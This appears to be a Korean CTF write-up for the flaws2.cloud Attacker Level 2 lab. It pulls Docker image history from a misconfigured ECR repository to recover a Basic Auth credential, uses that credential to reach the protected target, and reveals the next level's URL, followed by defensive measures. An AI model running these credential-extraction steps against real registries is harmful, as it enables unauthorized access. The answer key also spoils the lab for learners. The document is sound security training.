# Attacker Level 2 — 공개 ECR 이미지에서 자격증명 추출

> **URL**: http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud/
> **타겟 서버**: http://container.target.flaws2.cloud/ (HTTP Basic Auth 로 잠김)
> **ECR 레포지토리**: `653711331788.dkr.ecr.us-east-1.amazonaws.com/level2`
> **핵심 기술**: ECR 레포 정책 오설정 · Docker 이미지 레이어 분석
> **난이도**: ⭐⭐
> **본인 AWS 계정 필요**: ❌ (Attacker L1 에서 얻은 임시 키로 충분)

## 🎯 목표

문제 페이지가 직접 말해준다: "**타겟은 ECS 컨테이너이며 ECR 레포지토리 이름은 `level2`**". 레포 정책이 공개돼 있어 L1 역할 키로도 이미지 정보를 읽을 수 있다. **이미지 레이어 히스토리**에 남은 `htpasswd` 명령에서 Basic Auth 자격증명을 꺼내 잠긴 타겟을 통과한다.

## 🧭 공식 힌트

<details>
<summary><b>Hint 1</b></summary>

> 타겟: http://container.target.flaws2.cloud/. 401 을 돌려줍니다. ECR 레포 이름은 `level2`.

</details>

<details>
<summary><b>Hint 2</b></summary>

> `aws ecr describe-images --registry-id 653711331788 --repository-name level2` 가 Attacker L1 키로도 통합니다. 레포 정책이 공개이기 때문.

</details>

<details>
<summary><b>Hint 3</b></summary>

> `docker pull` 이 설치돼 있다면 가장 간단합니다. 없다면 **manifest → config blob → `.history`** 로 Dockerfile 한 줄 한 줄을 복원할 수 있습니다.

</details>

## 📚 사전 지식

- ECR 은 **레포지토리 정책**으로 `Principal: *` 을 허용할 수 있다 (공개 pull).
- Docker 이미지 manifest 는 **layers** 와 **config blob** 으로 구성. config 의 `.history[].created_by` 에 Dockerfile 각 줄이 그대로 남아 있다.
- 이미지 레이어 안에서 지워진 파일도 **이전 레이어**에는 살아 있는 경우가 많다.

## 🔍 정찰

### 1. 타겟 상태 확인
```bash
curl -sI http://container.target.flaws2.cloud/ | head -3
# HTTP/1.1 401 Unauthorized
# WWW-Authenticate: Basic realm="Restricted Content"
```

### 2. Attacker L1 임시 키 로드 (아직 세션 유효하면)
```bash
source /tmp/l1creds.sh     # Attacker L1 에서 저장한 파일
aws sts get-caller-identity --region us-east-1
```
> 세션이 만료됐으면 Attacker L1 을 다시 실행하여 새 키를 받는다.

### 3. 레포 이미지 확인 (describe-images 는 L1 역할 정책에 포함돼 있음)
```bash
aws ecr describe-images \
  --registry-id 653711331788 \
  --repository-name level2 \
  --region us-east-1
```
출력:
```json
{"imageDetails":[{"registryId":"653711331788","repositoryName":"level2","imageDigest":"sha256:513e...","imageTags":["latest"],...}]}
```

## 🧨 취약점 원리

- ECR 레포에 `Principal: *` 정책이 있거나, 이번 경우처럼 **Lambda/ECS 태스크 역할에게 pull 을 허용**하는 정책이 공격자 손에 들어가면 이미지 전체가 노출.
- 개발자는 이미지 빌드 중 `htpasswd -b ... secret_password` 같은 **명령을 레이어로 박제**해 버리는 실수를 자주 한다.
- `docker history --no-trunc` 한 줄로 전부 드러남.

## 🛠 풀이

두 경로 중 하나를 선택.

### 경로 A — Docker 가 있을 때 (가장 쉬움)

```bash
# ECR 로그인 (임시 키 로드 상태에서)
aws ecr get-login-password --region us-east-1 \
  | docker login --username AWS --password-stdin 653711331788.dkr.ecr.us-east-1.amazonaws.com

# pull + history
docker pull 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest
docker history --no-trunc 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest \
  | grep htpasswd
# /bin/sh -c htpasswd -b -c /etc/nginx/.htpasswd flaws2 secret_password
```

### 경로 B — Docker 없이 manifest → config blob 직접 다운로드

```bash
# 1. manifest 에서 config digest 추출
CFG=$(aws ecr batch-get-image --registry-id 653711331788 --repository-name level2 \
        --image-ids imageTag=latest --region us-east-1 \
      | jq -r '.images[0].imageManifest' | jq -r '.config.digest')
echo "$CFG"    # sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621

# 2. ECR HTTP API 로 blob 받기 (리다이렉트 따라감)
TOKEN=$(aws ecr get-authorization-token --region us-east-1 | jq -r '.authorizationData[0].authorizationToken')
curl -sL -H "Authorization: Basic $TOKEN" \
  "https://653711331788.dkr.ecr.us-east-1.amazonaws.com/v2/level2/blobs/$CFG" -o /tmp/cfg.json

# 3. Dockerfile 히스토리에서 htpasswd 줄 추출
jq -r '.history[].created_by' /tmp/cfg.json | grep htpasswd
# /bin/sh -c htpasswd -b -c /etc/nginx/.htpasswd flaws2 secret_password
```

### 4. 획득한 자격증명으로 Basic Auth 통과
```bash
curl -s -u 'flaws2:secret_password' http://container.target.flaws2.cloud/ \
  | grep -Eo 'level[0-9]-[^"]+flaws2\.cloud' | head -1
# level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud
```

## 🚪 정답 & 다음 레벨

<details>
<summary>정답 펼치기</summary>

- Basic Auth: `flaws2:secret_password`
- 다음 레벨: **http://level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud/**
- 교훈: 이미지 레이어는 **불변 히스토리**. `RUN` 명령에 비밀을 넣으면 지워도 남는다.

</details>

## 🌍 실제 세계 사례

- 2019 년 Vine 의 Docker 이미지 공개로 전체 소스 유출.
- Docker Hub·ECR·GHCR 의 공개 이미지 스캐너들은 매일 수천 건의 평문 AWS 키·SSH 개인키를 신고한다.

## 🛡 방어 대책

### ① 레포 정책 점검 — `Principal: *` 금지
```bash
aws ecr set-repository-policy --repository-name level2 \
  --policy-text '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::222233334444:root"},"Action":"ecr:BatchGetImage"}]}'
```

### ② 멀티스테이지 빌드로 빌드-only 파일 제외
```dockerfile
FROM node:20 AS build
COPY . .
RUN npm ci && npm run build

FROM node:20-slim
COPY --from=build /app/dist ./dist
CMD ["node", "dist/index.js"]
```

### ③ 빌드 시 비밀을 **BuildKit secret** 으로
```dockerfile
# syntax=docker/dockerfile:1.6
RUN --mount=type=secret,id=aws_creds \
    AWS_SHARED_CREDENTIALS_FILE=/run/secrets/aws_creds \
    aws s3 cp s3://my/data /app/data
```
`docker build --secret id=aws_creds,src=~/.aws/credentials ...` 로 전달하면 **최종 이미지에 포함되지 않음**.

### ④ 이미지 스캐닝
- ECR Image Scanning (basic + enhanced)
- `trivy`, `grype` — 로컬에서 빌드 후 비밀 패턴·CVE 검사
- pre-push hook 으로 자동화

### ⑤ CloudTrail 모니터링
`ecr:BatchGetImage` 요청자의 ARN/IP 를 로깅. 외부 IP 가 공개 레포를 대량 pull 하면 경보.

## ✅ 체크리스트

- [ ] `aws ecr describe-images` 가 L1 키로도 성공
- [ ] `docker history --no-trunc` 또는 config blob 의 `.history` 에서 htpasswd 줄 발견
- [ ] `flaws2:secret_password` 로 타겟 통과
- [ ] 본인 ECR 레포를 공개로 두고 `trivy image` 로 비밀 탐지 실습

## ⏭ 다음

[← Attacker L1](level-01.md) · [Attacker Level 3 →](level-03.md)
